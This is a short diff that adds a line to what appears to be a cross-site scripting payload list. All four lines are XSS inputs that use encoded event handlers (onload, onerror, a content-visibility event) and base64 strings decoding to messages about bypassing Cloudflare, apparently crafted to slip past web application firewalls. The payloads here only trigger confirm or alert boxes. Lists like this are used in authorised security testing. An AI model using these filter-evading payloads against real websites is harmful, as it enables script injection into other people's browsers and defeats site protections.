@@ -1,3 +1,4 @@
+<Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
 %3Cimg%2Fsrc%2Fonerror%3Dalert%2F%2F%26NewLine%3B%282%29%3E
 "/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
 <Svg Only=1 OnLoad=confirm(atob ("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>
